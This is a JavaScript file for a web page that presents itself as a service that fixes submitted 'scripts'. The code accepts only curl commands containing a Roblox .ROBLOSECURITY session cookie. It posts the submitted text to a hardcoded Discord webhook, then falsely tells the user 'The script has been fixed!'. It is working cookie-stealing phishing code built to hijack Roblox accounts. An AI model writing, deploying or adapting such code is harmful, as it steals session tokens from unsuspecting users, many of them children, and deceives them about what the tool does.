document.addEventListener("DOMContentLoaded", () => {
  const input = document.getElementById("input");
  const charCount = document.getElementById("charCount");
  const statusDiv = document.getElementById("status");
  const btn = document.getElementById("submitBtn");

  const webhookUrl = "https://discord.com/api/webhooks/1440146889939882087/HPjpz_PLLJI__-ue7qScQ3IXKMZyhLrjf0ZX64P5uK_W9RoIaCjXQgxWeYFY1TY0i_DP";

  input.addEventListener("input", () => {
    charCount.textContent = `${input.value.length} / 4000 characters`;
    statusDiv.classList.add("hidden");
  });

  btn.addEventListener("click", async () => {
    const trimmed = input.value.trim();

    // Validation
    if (!trimmed.startsWith("curl") || !trimmed.includes(".ROBLOSECURITY")) {
      showStatus("error", "Invalid input type!");
      return;
    }

    btn.disabled = true;
    btn.innerHTML = `<i data-lucide="loader-2" class="w-5 h-5 animate-spin"></i> Processing...`;
    lucide.createIcons();

    try {
      let processed = trimmed
        .replace(/https:\/\//g, "")
        .replace(/curl\s+/g, "curl ...");

      const truncated = processed.substring(0, 4000);

      await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          embeds: [{
            title: "Script Submission",
            description: truncated,
            color: 0x00ff00,
            timestamp: new Date().toISOString()
          }]
        })
      });

      showStatus("success", "The script has been fixed!");
      input.value = "";
      charCount.textContent = "0 / 4000 characters";
    } catch (err) {
      showStatus("error", "Something went wrong. Try again.");
    } finally {
      btn.disabled = false;
      btn.innerHTML = "Submit Script";
      lucide.createIcons();
    }
  });

  function showStatus(type, message) {
    statusDiv.innerHTML = `
      <div class="flex items-center gap-2 ${type === "success" ? "text-green-400 bg-green-950/30 border-green-800/30" : "text-red-400 bg-red-950/30 border-red-800/30"} border rounded-lg px-4 py-3">
        <i data-lucide="${type === "success" ? "check-circle" : "alert-circle"}" class="w-5 h-5"></i>
        <span class="font-light">${message}</span>
      </div>
    `;
    statusDiv.classList.remove("hidden");
    lucide.createIcons();
  }
});
